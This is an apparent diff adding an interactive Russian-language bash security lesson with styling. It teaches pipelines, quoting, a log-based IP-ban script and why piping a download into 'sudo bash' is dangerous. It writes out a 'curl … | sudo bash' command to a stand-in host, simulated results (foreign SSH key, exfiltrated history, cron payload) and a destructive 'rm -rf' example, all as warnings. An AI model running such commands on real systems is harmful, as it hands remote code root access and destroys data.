+set -u   <span class="bs-cm"># нет переменной — стоп</span>
+LOG="/var/log/kruzhok/auth.log"
+TOP=$(grep "Failed" <span class="bs-qv">"$LOG"</span> \
+  | awk '{print $2}' | sort \
+  | uniq -c | sort -nr | head -1)
+COUNT=$(echo <span class="bs-qv">"$TOP"</span> | awk '{print $1}')
+IP=$(echo <span class="bs-qv">"$TOP"</span> | awk '{print $2}')
+if [ <span class="bs-qv">"${COUNT:-0}"</span> -gt 100 ]; then
+  ufw deny from <span class="bs-qv">"$IP"</span>
+  echo "$(date) $IP" &gt;&gt; bans.log
+fi</pre>
+    <p class="bs-codecap">Тот же конвейер, только внутри <code>$( … )</code>: вывод команды кладём в&nbsp;переменную. <code>ufw deny</code> — добавить правило файрвола «не&nbsp;пускать этот IP».</p>
+
+    <div class="bs-say"><span class="bs-who bs-son">СОНЯ</span><span class="bs-bub">А зачем везде кавычки вокруг <code>$</code>?</span></div>
+    <div class="bs-say"><span class="bs-who">ДЯДЯ МИША</span><span class="bs-bub">Покажу, что бывает без них. Вот уборка старых отчётов.</span></div>
+
+    <div class="bs-qdemo">
+      <code class="bs-qset">DIR="/home/sonya/Отчёты кружка"</code>
+      <p class="bs-cmd bs-cmd-big"><span class="bs-ps">$</span> <span data-qcmd="">rm -rf $DIR</span></p>
+      <div class="bs-words" data-qwords="" hidden=""></div>
+      <p class="bs-qnote" data-qnote="" aria-live="polite"></p>
+    </div>
+    <div class="bs-act"><button class="bs-btn bs-y" type="button" data-act="q">Показать, что увидит bash</button></div>
+
+    <div class="bs-part" data-l5run="" hidden="">
+      <p class="bs-def">Пустая переменная ещё страшнее: <code>rm -rf "$DIR"/*</code> станет <code>rm -rf /*</code>. Страховка — <code>${DIR:?}</code>: если DIR пустая или не&nbsp;задана, bash остановится, а&nbsp;не&nbsp;удалит.</p>
+      <div class="bs-say"><span class="bs-who">ДЯДЯ МИША</span><span class="bs-bub">Скрипт готов. Запускаем.</span></div>
+      <div class="bs-term">
+        <div class="bs-tbar"><span></span><span></span><span></span><b>Терминал</b></div>
+        <div class="bs-tbody" data-l5term="" aria-live="polite"><p class="bs-dim">root@kruzhok:/opt/kruzhok# — ты на сервере</p></div>
+      </div>
+      <div class="bs-act"><button class="bs-btn bs-y" type="button" data-act="run">▶ Запустить ./ban.sh</button></div>
+    </div>
+
+    <div class="bs-after">
+      <p class="bs-big">Код выхода 0.<br><span>Робот за&nbsp;дверью.</span></p>
+      <div class="bs-say"><span class="bs-who">ДЯДЯ МИША</span><span class="bs-bub">Последний штрих: пусть скрипт дежурит ночью вместо нас. Одна строка в&nbsp;cron — запуск каждые 5&nbsp;минут.</span></div>
+      <code class="bs-cron">*/5 * * * * /opt/kruzhok/ban.sh</code>
+      <p class="bs-def">Это и&nbsp;есть автоматизация. Так же скрипты каждый день ищут секреты в&nbsp;коде, проверяют права на&nbsp;файлы и&nbsp;собирают отчёты по&nbsp;логам. Готовый инструмент ровно для&nbsp;нашей задачи — <b>fail2ban</b>: теперь ты знаешь, как он думает.</p>
+      <div class="bs-act"><button class="bs-btn bs-y" type="button" data-goto="ix-bash-battle">К битве с&nbsp;Однострочником ▼</button></div>
+    </div>
+  </div>
+</section>
+
+<!-- ========== HACK OVERLAY ========== -->
+<div class="bs-hack" role="dialog" aria-modal="true" aria-labelledby="ix-bash-hk" hidden="">
+  <div class="bs-hkin">
+    <span class="bs-pline bs-hkpl" aria-hidden="true"><i class="bs-pc">curl</i><span class="bs-pipe"></span><i class="bs-pb">sudo bash</i></span>
+    <p class="bs-hkt" id="ix-bash-hk">ВЗЛОМ!</p>
+    <div class="bs-hkterm" aria-label="Что сделал скрипт">
+      <p>$ curl -s https://fix-all.example/fix.sh | sudo bash</p>
+      <p class="bs-ok-l">Чиню сервер...</p>
+      <p class="bs-bad-l">+ чужой ключ в /root/.ssh/authorized_keys</p>
+      <p class="bs-bad-l">+ история команд Сони ушла на чужой сервер</p>
+      <p class="bs-bad-l">+ cron: каждые 5 минут качать новый код</p>
+      <p class="bs-ok-l">Готово! Всё починено ✓</p>
+    </div>
+    <p class="bs-hksay">Ты сама дала мне root. Спасибо!</p>
+    <button class="bs-btn bs-y" type="button" data-act="rewind">◀◀ Откатить время</button>
+  </div>
+</div>
+
+<!-- ========== BATTLE ========== -->
+<section class="bs-battle" id="ix-bash-battle" aria-labelledby="ix-bash-bt" tabindex="-1">
+  <div class="bs-bh">
+    <span class="bs-bface" aria-hidden="true">|</span>
+    <div class="bs-bhx">
+      <h2 class="bs-bt" id="ix-bash-bt">Битва со&nbsp;злодеем</h2>
+      <div class="bs-hp" role="img" aria-label="Здоровье Однострочника" data-hp-wrap=""><i data-hp=""></i><b data-hp-t="">ОДНОСТРОЧНИК · HP 3/3</b></div>
+    </div>
+  </div>
+  <div class="bs-bbody" data-battle="" aria-live="polite"></div>
+</section>
+
+<!-- ========== INTERVIEW ========== -->
+<section class="bs-iv" aria-labelledby="ix-bash-ivt">
+  <p class="bs-ivk">ВОПРОС С СОБЕСЕДОВАНИЯ · JUNIOR APPSEC</p>
+  <h2 class="bs-ivq" id="ix-bash-ivt">В&nbsp;инструкции к&nbsp;утилите написано: «Установка: <code>curl … | sudo bash</code>». Чем это опасно и&nbsp;как бы ты поставил её безопасно?</h2>
+  <div class="bs-think">
+    <b>Подумай сам</b>
+    <span>Подсказка: кто видит код до&nbsp;запуска? С&nbsp;какими правами он выполняется? И&nbsp;что гарантирует HTTPS, а&nbsp;что нет?</span>
+  </div>
+  <button class="bs-btn bs-y" type="button" data-act="iv" aria-expanded="false" aria-controls="ix-bash-iva">Показать сильный ответ</button>
+  <div class="bs-iva" id="ix-bash-iva" hidden="">
+    <ol>
+      <li><b>Что происходит.</b> Код с&nbsp;чужого сервера сразу выполняется с&nbsp;правами root. Никто его не&nbsp;прочитал, ничто его не&nbsp;проверило.</li>
+      <li><b>Риски.</b> Взлом сайта или зеркала, подмена файла для&nbsp;<code>curl | bash</code>, обрыв загрузки посреди строки. HTTPS защищает дорогу, а&nbsp;не&nbsp;намерения автора.</li>
+      <li><b>Как безопасно.</b> Пакетный менеджер, если есть. Иначе скачать файл, сверить подпись или SHA-256 из&nbsp;независимого источника, прочитать, сначала запустить в&nbsp;виртуалке, с&nbsp;минимальными правами.</li>
+      <li><b>Свои скрипты.</b> Кавычки вокруг переменных, <code>set -euo pipefail</code>, проверка ShellCheck, никаких паролей в&nbsp;аргументах команд.</li>
+    </ol>
+    <p class="bs-ivx"><b>Ошибка новичка:</b> «Там же HTTPS и&nbsp;известный сайт — значит, безопасно». HTTPS гарантирует, что файл не&nbsp;подменили по&nbsp;дороге, но&nbsp;не&nbsp;что в&nbsp;нём нет вреда.</p>
+  </div>
+</section>
+
+<!-- ========== CHEAT SHEET ========== -->
+<section class="bs-cs" aria-labelledby="ix-bash-cst">
+  <h2 class="bs-cst" id="ix-bash-cst">Шпаргалка: что важно знать</h2>
+  <ol class="bs-csl">
+    <li><span class="bs-csn" aria-hidden="true">01</span><div><b>Терминал ≠ шелл</b><p>Терминал — окно для&nbsp;текста. Шелл (bash) — программа, которая читает строку и&nbsp;запускает команды.</p></div></li>
+    <li><span class="bs-csn" aria-hidden="true">02</span><div><b>Команда, флаги, аргументы</b><p><code>grep -c "Failed" auth.log</code>: программа, настройка с&nbsp;дефисом, то, над&nbsp;чем работать.</p></div></li>
+    <li><span class="bs-csn" aria-hidden="true">03</span><div><b>Конвейер |</b><p>Вывод одной команды — вход следующей. Перед <code>uniq -c</code> всегда <code>sort</code>.</p></div></li>
+    <li><span class="bs-csn" aria-hidden="true">04</span><div><b>Потоки и&nbsp;коды</b><p><code>&gt;</code> перезаписывает, <code>&gt;&gt;</code> дописывает, <code>2&gt;</code> уводит ошибки. <code>$?</code> = 0 — успех.</p></div></li>
+    <li><span class="bs-csn" aria-hidden="true">05</span><div><b>Кавычки</b><p><code>"$VAR"</code> — одно слово. Без кавычек пробел режет значение, и&nbsp;<code>rm -rf</code> удаляет не&nbsp;то.</p></div></li>
+    <li><span class="bs-csn" aria-hidden="true">06</span><div><b>Скрипт</b><p>Первая строка <code>#!/usr/bin/env bash</code>, потом <code>chmod +x</code> и&nbsp;запуск <code>./script.sh</code>.</p></div></li>
+    <li><span class="bs-csn" aria-hidden="true">07</span><div><b>Сначала прочитай</b><p><code>curl | sudo bash</code> — чужой код с&nbsp;правами root. Пароли в&nbsp;команды не&nbsp;пиши: они остаются в&nbsp;истории.</p></div></li>
+  </ol>
+  <p class="bs-train"><b>Тренируйся легально:</b> picoCTF (раздел General Skills), TryHackMe (комнаты Linux Fundamentals), а&nbsp;скрипты пробуй на&nbsp;своей виртуалке. Чужие серверы трогать нельзя.</p>
+</section>
+
+</section>
+<style>
+.ix-bash{--ink:#141414;--paper:#fff7e3;--yel:#ffd60a;--red:#ff3b3b;--rdk:#c81e1e;--green:#2ee59d;--gdk:#0a7a4e;--muted:#5b5446;--tx:#f3efe4;
+  --f-mono:'Rubik Mono One',sans-serif;--f-cap:'Russo One',sans-serif;--f-hand:Neucha,cursive;--f-text:Rubik,system-ui,sans-serif;--code:ui-monospace,'SFMono-Regular',Menlo,Consolas,'Liberation Mono',monospace;
+  position:relative;display:block;color:var(--ink);font-family:var(--f-text);font-size:18px;line-height:1.5;max-width:900px;margin:0 auto}
+.ix-bash *,.ix-bash *::before,.ix-bash *::after{box-sizing:border-box}
+.ix-bash button{font:inherit;color:inherit}
+.ix-bash :focus-visible{outline:4px solid var(--red);outline-offset:3px}
+.ix-bash [hidden]{display:none !important}
+.ix-bash p{margin:0}
+.ix-bash code{font-family:var(--code);font-size:.92em;font-weight:600}
+.ix-bash p code,.ix-bash li code,.ix-bash h2 code{background:rgba(255,214,10,.45);padding:0 4px;border-radius:3px;overflow-wrap:anywhere}
+.ix-bash .bs-sr{position:absolute;width:1px;height:1px;overflow:hidden;clip:rect(0 0 0 0);white-space:nowrap}
+
+/* HUD */
+.ix-bash .bs-hud{position:sticky;top:0;z-index:30;display:none;align-items:center;gap:10px;padding:8px 12px;background:var(--ink);color:#fff;border:3px solid var(--ink)}
+.ix-bash .bs-hud.bs-on{display:flex;animation:ix-bash-drop .4s cubic-bezier(.2,1.4,.4,1)}
+.ix-bash .bs-hud-l{font-family:var(--f-cap);font-size:12px;color:var(--yel);white-space:nowrap}
+.ix-bash .bs-bar{flex:1;min-width:50px;height:20px;border:2px solid #fff;background:#2a2a2a;position:relative;overflow:hidden}
+.ix-bash .bs-bar i{position:absolute;inset:0 auto 0 0;width:0;background:var(--yel);transition:width .6s cubic-bezier(.3,1.5,.5,1);background-image:repeating-linear-gradient(-45deg,rgba(0,0,0,.25) 0 6px,transparent 6px 12px)}
+.ix-bash .bs-bar b{position:absolute;inset:0;display:grid;place-items:center;font-family:var(--f-cap);font-weight:400;font-size:12px;text-shadow:0 0 3px #000,0 0 2px #000}
+.ix-bash .bs-hud.bs-hit{animation:ix-bash-shake .4s}
+.ix-bash .bs-hud.bs-hit .bs-bar{border-color:var(--red)}
+.ix-bash .bs-pips{display:flex;gap:4px}
+.ix-bash .bs-pips span{width:22px;height:22px;border:2px solid #fff;display:grid;place-items:center;font-family:var(--f-cap);font-size:11px}
+.ix-bash .bs-pips span.bs-done{background:var(--yel);border-color:var(--yel);color:var(--ink)}
+
+/* MISSION + POSTER */
+.ix-bash .bs-mission{position:relative;margin:24px 0 0;background:var(--ink);color:#fff;border:3px solid var(--ink);box-shadow:8px 8px 0 var(--yel);display:grid;grid-template-columns:1fr 1fr;overflow:hidden}
+.ix-bash .bs-poster{position:relative;min-height:440px;overflow:hidden;background:#0b0b0b;border-right:3px solid var(--yel);display:flex;flex-direction:column;justify-content:center;padding:28px 22px 96px;isolation:isolate}
+.ix-bash .bs-pdots{position:absolute;inset:0;z-index:-1;background-image:radial-gradient(rgba(255,214,10,.55) 1.4px,transparent 2.2px);background-size:9px 9px;-webkit-mask-image:radial-gradient(circle at 75% 30%,#000 0,transparent 70%);mask-image:radial-gradient(circle at 75% 30%,#000 0,transparent 70%)}
+.ix-bash .bs-pname{display:block;font-family:var(--f-mono);font-size:clamp(40px,7vw,58px);line-height:.95;color:var(--yel);letter-spacing:-.02em;text-shadow:5px 5px 0 #000,6px 6px 0 rgba(255,59,59,.9)}
+.ix-bash .bs-pline{display:flex;align-items:center;gap:14px;margin-top:26px;font-family:var(--code);font-weight:800;font-size:clamp(20px,3.4vw,28px);line-height:1}
+.ix-bash .bs-pc{font-style:normal;color:rgba(255,255,255,.55)}
+.ix-bash .bs-pb{font-style:normal;color:var(--red);text-shadow:0 0 18px rgba(255,59,59,.8)}
+.ix-bash .bs-pipe{flex:0 0 22px;height:96px;background:var(--yel);background-image:repeating-linear-gradient(-45deg,var(--ink) 0 7px,transparent 7px 16px);border:3px solid var(--yel);box-shadow:0 0 26px rgba(255,214,10,.7)}
+.ix-bash .bs-tape{position:absolute;left:-20%;right:-20%;bottom:44px;transform:rotate(-6deg);background:var(--yel);color:var(--ink);border-top:4px solid var(--ink);border-bottom:4px solid var(--ink);box-shadow:0 0 0 3px var(--yel);overflow:hidden;white-space:nowrap;font-family:var(--code);font-weight:800;font-size:16px;line-height:1;padding:9px 0}
+.ix-bash .bs-tape span{display:inline-block;padding-left:0}
+.ix-bash .bs-ptag{position:absolute;left:14px;top:14px;font-family:var(--f-cap);font-size:13px;background:var(--ink);color:var(--yel);padding:5px 10px;border:2px solid var(--yel)}
+.ix-bash .bs-mbody{padding:28px 26px;display:flex;flex-direction:column;gap:18px;justify-content:center}
+.ix-bash .bs-kick{font-family:var(--f-cap);font-size:14px;letter-spacing:.12em;color:var(--yel)}
+.ix-bash .bs-mt{margin:0;font-family:var(--f-mono);font-weight:400;font-size:46px;line-height:1;color:var(--yel);text-transform:uppercase}
+.ix-bash .bs-msub{font-size:20px;line-height:1.4}
+.ix-bash .bs-msub em{font-style:normal;color:var(--ink);background:var(--yel);padding:0 5px}
+.ix-bash .bs-motto{font-family:var(--f-hand);font-size:22px;line-height:1.2;color:#ffb3b3}
+.ix-bash .bs-moves{list-style:none;margin:0;padding:0;display:grid;grid-template-columns:repeat(5,1fr);gap:6px}
+.ix-bash .bs-moves li{border:2px solid #fff;padding:7px 6px 8px}
+.ix-bash .bs-moves b{display:block;font-family:var(--f-mono);font-weight:400;font-size:19px;color:var(--ink);-webkit-text-stroke:1.5px var(--yel)}
+.ix-bash .bs-moves span{display:block;font-family:var(--f-cap);font-size:13px;line-height:1.15;margin-top:4px}
+.ix-bash .bs-moves li.bs-x{border-color:var(--yel);background:rgba(255,214,10,.18)}
+.ix-bash .bs-go{align-self:flex-start;min-height:56px;padding:0 26px;font-family:var(--f-cap);font-size:20px;background:var(--yel);color:var(--ink);border:3px solid var(--ink);box-shadow:5px 5px 0 var(--red);cursor:pointer;transition:transform .12s,box-shadow .12s}
+.ix-bash .bs-go:hover{transform:translate(-2px,-2px);box-shadow:7px 7px 0 var(--red)}
+.ix-bash .bs-go:active{transform:translate(3px,3px);box-shadow:2px 2px 0 var(--red)}
+.ix-bash.bs-anim .bs-tape span{animation:ix-bash-marq 14s linear infinite}
+.ix-bash.bs-anim .bs-pipe{animation:ix-bash-pipeglow 2.4s ease-in-out infinite}
+.ix-bash.bs-anim .bs-go:not(:disabled){animation:ix-bash-pulse 1.8s ease-in-out infinite}
+
+/* LEVELS */
+.ix-bash .bs-lvl{position:relative;margin-top:48px;border:3px solid var(--ink);background:#fffdf6;box-shadow:6px 6px 0 var(--ink);scroll-margin-top:56px}
+.ix-bash .bs-lh{display:flex;flex-wrap:wrap;align-items:center;gap:8px 12px;padding:14px 18px;border-bottom:3px solid var(--ink);background:var(--yel)}
+.ix-bash .bs-lh-v{background:var(--ink);color:var(--yel)}
+.ix-bash .bs-lh-v .bs-ln{background:var(--yel);color:var(--ink)}
+.ix-bash .bs-ln{font-family:var(--f-cap);font-size:13px;background:var(--ink);color:var(--yel);padding:4px 10px}
+.ix-bash .bs-lt{margin:0;font-family:var(--f-mono);font-weight:400;font-size:24px;line-height:1.15}
+.ix-bash .bs-ok{display:none;margin-left:auto;font-family:var(--f-cap);font-size:13px;color:var(--ink);background:var(--green);border:2px solid var(--ink);padding:3px 10px;transform:rotate(2deg)}
+.ix-bash .bs-clear .bs-ok{display:inline-block}
+.ix-bash .bs-lb{padding:22px 20px 24px}
+.ix-bash .bs-locked{pointer-events:none;user-select:none}
+.ix-bash .bs-locked .bs-lb{filter:grayscale(1) blur(3px);opacity:.35;max-height:260px;overflow:hidden}
+.ix-bash .bs-lockcap{display:none}
+.ix-bash .bs-locked .bs-lockcap{display:grid;position:absolute;inset:56px 0 0;place-items:center;z-index:5}
+.ix-bash .bs-lockcap span{font-family:var(--f-cap);font-size:16px;background:var(--ink);color:#fff;padding:10px 16px}
+.ix-bash .bs-after{display:none;margin-top:30px;padding-top:26px;border-top:3px dashed rgba(20,20,20,.25)}
+.ix-bash .bs-lvl.bs-clear .bs-after{display:block;animation:ix-bash-up .4s ease-out}
+.ix-bash .bs-part{margin-top:24px;animation:ix-bash-up .4s ease-out}
+
+.ix-bash .bs-say{display:flex;gap:10px;align-items:flex-start;margin:0 0 16px}
+.ix-bash .bs-who{flex:0 0 auto;font-family:var(--f-cap);font-size:12px;background:var(--ink);color:#fff;padding:3px 8px;margin-top:8px;white-space:nowrap}
+.ix-bash .bs-who.bs-son{background:#fff;color:var(--ink);border:2px solid var(--ink)}
+.ix-bash .bs-bub{font-family:var(--f-hand);font-size:23px;line-height:1.22;background:#fff;border:3px solid var(--ink);border-radius:16px;padding:7px 14px;box-shadow:3px 3px 0 var(--ink);min-width:0}
+.ix-bash .bs-bub b{font-family:var(--f-text);font-weight:700;font-size:.85em}
+.ix-bash .bs-bub code{font-size:.72em;background:rgba(255,214,10,.5);padding:0 4px;overflow-wrap:anywhere}
+
+/* terminal */
+.ix-bash .bs-term{margin:20px 0 0;border:3px solid var(--ink);background:var(--ink);color:var(--tx);box-shadow:5px 5px 0 var(--yel);overflow:hidden}
+.ix-bash .bs-tbar{display:flex;align-items:center;gap:6px;padding:8px 12px;background:#2a2a2a;border-bottom:2px solid #000}
+.ix-bash .bs-tbar span{width:11px;height:11px;border-radius:50%;background:#555}
+.ix-bash .bs-tbar span:first-child{background:var(--red)}
+.ix-bash .bs-tbar span:nth-child(2){background:var(--yel)}
+.ix-bash .bs-tbar b{margin-left:8px;font-family:var(--f-cap);font-weight:400;font-size:13px;color:#bdb6a4}
+.ix-bash .bs-tbody{padding:16px 16px 18px;font-family:var(--code);font-size:17px;line-height:1.5;min-height:64px}
+.ix-bash .bs-tbody p{overflow-wrap:anywhere}
+.ix-bash .bs-cmd{font-family:var(--code);font-weight:700;font-size:19px;overflow-wrap:anywhere}
+.ix-bash .bs-ps{color:var(--yel);font-weight:700}
+.ix-bash .bs-cur{display:inline-block;width:.6em;height:1.05em;vertical-align:-3px;background:var(--yel);margin-left:3px}
+.ix-bash.bs-anim .bs-cur{animation:ix-bash-blink 1s steps(1) infinite}
+.ix-bash .bs-shell{margin-top:16px;font-family:var(--f-cap);font-size:15px;color:var(--yel)}
+.ix-bash .bs-words{display:flex;flex-wrap:wrap;gap:10px;margin-top:10px}
+.ix-bash .bs-wd{display:flex;flex-direction:column;gap:4px;padding:8px 10px;border:2px solid #fff;background:#222;min-width:0;max-width:100%}
+.ix-bash .bs-wd code{font-size:20px;font-weight:800;color:#fff;overflow-wrap:anywhere}
+.ix-bash .bs-wd small{font-family:var(--f-text);font-size:15px;line-height:1.25;color:#d8d2c2}
+.ix-bash .bs-wd-c{border-color:var(--yel)}.ix-bash .bs-wd-c code{color:var(--yel)}
+.ix-bash .bs-wd-f{border-color:#9bd3ff}.ix-bash .bs-wd-f code{color:#9bd3ff}
+.ix-bash .bs-wd-bad{border-color:var(--red);background:#3a1414}.ix-bash .bs-wd-bad code{color:#ff8a8a}.ix-bash .bs-wd-bad small{color:#ffc2c2}
+.ix-bash .bs-wd-good{border-color:var(--green);background:#0f2a1f}.ix-bash .bs-wd-good code{color:var(--green)}
+.ix-bash.bs-anim .bs-words .bs-wd{animation:ix-bash-pop .45s cubic-bezier(.2,1.6,.4,1) both}
+.ix-bash.bs-anim .bs-words .bs-wd:nth-child(2){animation-delay:.12s}
+.ix-bash.bs-anim .bs-words .bs-wd:nth-child(3){animation-delay:.24s}
+.ix-bash.bs-anim .bs-words .bs-wd:nth-child(4){animation-delay:.36s}
+.ix-bash .bs-out{margin-top:14px;font-size:22px;font-weight:800;color:#fff}
+.ix-bash .bs-dim{color:#8f897a}
+.ix-bash .bs-err{color:#ff8a8a}
+.ix-bash .bs-good{color:var(--green)}
+
+.ix-bash .bs-act{margin-top:20px;display:flex;flex-wrap:wrap;gap:12px}
+.ix-bash .bs-btn{min-height:52px;padding:0 22px;font-family:var(--f-cap);font-size:18px;background:var(--ink);color:#fff;border:3px solid var(--ink);box-shadow:4px 4px 0 var(--yel);cursor:pointer;display:inline-flex;align-items:center;justify-content:center;gap:8px;transition:transform .1s,box-shadow .1s;text-align:center;line-height:1.2}
+.ix-bash .bs-btn:hover{transform:translate(-1px,-1px);box-shadow:5px 5px 0 var(--yel)}
+.ix-bash .bs-btn:active{transform:translate(3px,3px);box-shadow:1px 1px 0 var(--yel)}
+.ix-bash .bs-btn.bs-y{background:var(--yel);color:var(--ink);box-shadow:4px 4px 0 var(--ink)}
+.ix-bash .bs-btn.bs-y:hover{box-shadow:5px 5px 0 var(--ink)}
+.ix-bash .bs-btn:disabled{opacity:.4;cursor:default;transform:none}
+.ix-bash .bs-pair .bs-btn{flex:1 1 150px}
+.ix-bash .bs-legal{margin-top:14px;font-size:16px;color:var(--muted)}
+.ix-bash .bs-note{margin-top:18px;font-size:18px;line-height:1.45;border-left:5px solid var(--yel);padding:2px 0 2px 14px}
+.ix-bash .bs-def{margin-top:18px;font-size:18px;line-height:1.5}
+.ix-bash .bs-q{margin:26px 0 12px;font-family:var(--f-cap);font-size:22px;line-height:1.25}
+.ix-bash .bs-cnt{display:inline-block;margin-left:6px;font-family:var(--f-mono);font-size:18px;background:var(--ink);color:var(--yel);padding:2px 8px;vertical-align:2px}
+.ix-bash .bs-choices{display:grid;grid-template-columns:repeat(3,1fr);gap:12px}
+.ix-bash .bs-choices.bs-two-ch{grid-template-columns:1fr 1fr}
+.ix-bash .bs-ch{min-height:88px;padding:12px 14px;border:3px solid var(--ink);background:#fff;box-shadow:4px 4px 0 var(--ink);cursor:pointer;text-align:left;display:flex;flex-direction:column;gap:4px;transition:transform .1s,box-shadow .1s}
+.ix-bash .bs-ch:hover{transform:translate(-2px,-2px);box-shadow:6px 6px 0 var(--ink)}
+.ix-bash .bs-ch:active{transform:translate(3px,3px);box-shadow:1px 1px 0 var(--ink)}
+.ix-bash .bs-ch b{font-family:var(--f-cap);font-weight:400;font-size:19px;line-height:1.2}
+.ix-bash .bs-ch b code{font-size:20px;background:none;padding:0}
+.ix-bash .bs-ch span{font-size:16px;line-height:1.35;color:#3b372e}
+.ix-bash .bs-ch.bs-ch-v{border-color:var(--rdk)}
+.ix-bash .bs-ch.bs-wrong{background:#ffe1e1;border-color:var(--rdk);opacity:.7;cursor:default}
+.ix-bash .bs-ch.bs-wrong b{text-decoration:line-through}
+.ix-bash .bs-ch.bs-right{background:var(--green)}
+.ix-bash .bs-ch.bs-right span{color:var(--ink)}
+.ix-bash .bs-ch:disabled{cursor:default;transform:none}
+.ix-bash .bs-fb{margin-top:14px;font-size:18px;line-height:1.4}
+.ix-bash .bs-fb:empty{display:none}
+.ix-bash .bs-fb b{font-family:var(--f-cap);font-weight:400;margin-right:6px}
+.ix-bash .bs-fb.bs-bad b{color:var(--rdk)}
+.ix-bash .bs-fb.bs-good b{color:var(--gdk)}
+.ix-bash .bs-two{display:grid;gap:16px}
+.ix-bash .bs-two p{display:flex;gap:14px;align-items:flex-start;font-size:19px;line-height:1.38}
+.ix-bash .bs-two b{display:block;font-family:var(--f-cap);font-weight:400;font-size:24px;line-height:1.15;margin-bottom:2px}
+.ix-bash .bs-mk{flex:0 0 48px;height:48px;display:grid;place-items:center;border:3px solid var(--ink);background:#fff;font-family:var(--code);font-size:26px;font-weight:800;line-height:1}
+.ix-bash .bs-mk-y{background:var(--ink);color:var(--yel)}
+.ix-bash .bs-big{font-family:var(--f-mono);font-size:28px;line-height:1.18;margin-bottom:22px}
+.ix-bash .bs-big span{color:var(--rdk)}
+.ix-bash .bs-big .bs-ip{display:inline-block;font-family:var(--code);font-weight:800;font-size:1.25em;color:var(--ink);background:var(--yel);padding:2px 10px;border:3px solid var(--ink);box-shadow:4px 4px 0 var(--ink);margin-bottom:8px}
+
+/* PIPELINE (WOW) */
+.ix-bash .bs-goal{margin:4px 0 0;font-size:19px}
+.ix-bash .bs-goal b{font-family:var(--f-cap);font-weight:400}
+.ix-bash .bs-pipe-w{margin-top:20px;display:grid;grid-template-columns:minmax(0,1.05fr) minmax(0,1fr);gap:18px;align-items:start}
+.ix-bash .bs-stages{list-style:none;margin:0;padding:0;display:grid;gap:22px}
+.ix-bash .bs-st{position:relative;display:grid;grid-template-columns:minmax(0,1fr) auto;align-items:center;gap:4px 10px;padding:10px 12px 12px;background:#fff;border:3px solid var(--ink);box-shadow:4px 4px 0 var(--ink)}
+.ix-bash .bs-st::before{content:"";position:absolute;left:26px;top:-25px;height:22px;width:var(--win,24px);transform:translateX(-50%);background:var(--yel);background-image:repeating-linear-gradient(to bottom,var(--ink) 0 4px,transparent 4px 9px);border-left:3px solid var(--ink);border-right:3px solid var(--ink);transition:width .5s}
+.ix-bash .bs-st:first-child::before{display:none}
+.ix-bash.bs-anim .bs-st::before{animation:ix-bash-flow .45s linear infinite}
+.ix-bash .bs-stc code{display:block;font-size:17px;font-weight:800;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.ix-bash .bs-stn{font-family:var(--f-cap);font-size:14px;color:var(--muted);white-space:nowrap;text-align:right}
+.ix-bash .bs-stn b{font-family:var(--f-mono);font-weight:400;font-size:19px;color:var(--ink)}
+.ix-bash .bs-stbar{grid-column:1/-1;height:12px;background:#ece6d6;border:2px solid var(--ink);position:relative;overflow:hidden}
+.ix-bash .bs-stbar i{position:absolute;inset:0 auto 0 0;width:var(--p,100%);min-width:4px;background:var(--yel);border-right:2px solid var(--ink);transition:width .7s cubic-bezier(.3,1.3,.5,1)}
+.ix-bash .bs-st.bs-new{animation:ix-bash-drop2 .45s cubic-bezier(.2,1.4,.4,1)}
+.ix-bash .bs-st.bs-zero{border-color:var(--rdk);background:#ffe9e9}
+.ix-bash .bs-st.bs-zero .bs-stn b{color:var(--rdk)}
+.ix-bash .bs-st.bs-win{background:var(--yel)}
+.ix-bash .bs-ocol{position:sticky;top:60px;min-width:0}
+.ix-bash .bs-screen{border:3px solid var(--ink);background:var(--ink);color:var(--tx);box-shadow:5px 5px 0 var(--yel);overflow:hidden}
+.ix-bash .bs-scrv{position:relative;height:262px;overflow:hidden;padding:10px 12px;font-family:var(--code);font-size:14px;line-height:1.5}
+.ix-bash .bs-scrv pre{margin:0;font:inherit;white-space:pre;overflow:hidden}
+.ix-bash .bs-fall{will-change:transform}
+.ix-bash.bs-anim .bs-fall{animation:ix-bash-fall 9s linear infinite}
+.ix-bash .bs-scrv.bs-many::after{content:"";position:absolute;left:0;right:0;bottom:0;height:60px;background:linear-gradient(transparent,var(--ink))}
+.ix-bash .bs-more{position:absolute;z-index:2;right:10px;bottom:8px;font-family:var(--f-cap);font-size:13px;color:var(--ink);background:var(--yel);padding:3px 8px}
+.ix-bash .bs-scrv .bs-hl{display:block;color:var(--ink);background:var(--yel);font-weight:800;margin:0 -12px;padding:4px 12px;font-size:17px}
+.ix-bash.bs-anim .bs-scrv .bs-hl{animation:ix-bash-glow 1.4s ease-in-out infinite}
+.ix-bash .bs-found{display:inline-block;margin-top:12px;font-family:var(--f-mono);font-size:22px;color:var(--ink);background:var(--yel);border:3px solid #fff;padding:4px 12px;transform:rotate(-4deg)}
+.ix-bash.bs-anim .bs-found{animation:ix-bash-stamp .5s cubic-bezier(.2,1.6,.4,1) both}
+.ix-bash .bs-empty{color:#ff8a8a;font-family:var(--f-cap);font-size:16px}
+.ix-bash .bs-line{margin-top:20px;padding:12px 14px;background:var(--ink);color:#fff;font-family:var(--code);font-size:16px;line-height:1.5;border:3px solid var(--ink);overflow-wrap:anywhere}
+.ix-bash .bs-line code{font-size:16px;background:none;color:#fff}
+.ix-bash .bs-line .bs-pp{color:var(--yel);font-weight:800}
+.ix-bash .bs-trayt{margin-top:22px;font-family:var(--f-cap);font-size:18px}
+.ix-bash .bs-tray{margin-top:10px;display:grid;grid-template-columns:repeat(4,minmax(0,1fr));gap:10px}
+.ix-bash .bs-blk{min-height:76px;padding:10px 10px 9px;border:3px solid var(--ink);background:var(--yel);box-shadow:4px 4px 0 var(--ink);cursor:pointer;text-align:left;display:flex;flex-direction:column;justify-content:space-between;gap:4px;transition:transform .1s,box-shadow .1s,opacity .2s}
+.ix-bash .bs-blk code{font-size:16px;font-weight:800;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;max-width:100%}
+.ix-bash .bs-blk span{font-size:14px;line-height:1.25;color:#3b372e}
+.ix-bash .bs-blk:hover{transform:translate(-2px,-2px);box-shadow:6px 6px 0 var(--ink)}
+.ix-bash .bs-blk:active{transform:translate(3px,3px);box-shadow:1px 1px 0 var(--ink)}
+.ix-bash .bs-blk:disabled{background:#ece6d6;opacity:.45;box-shadow:none;transform:none;cursor:default}
+.ix-bash .bs-hint{margin:16px 0 0}
+.ix-bash .bs-scrv.bs-won{height:auto;min-height:150px;padding-bottom:16px}
+.ix-bash .bs-hint .bs-bub{min-height:52px}
+
+/* L3 IO */
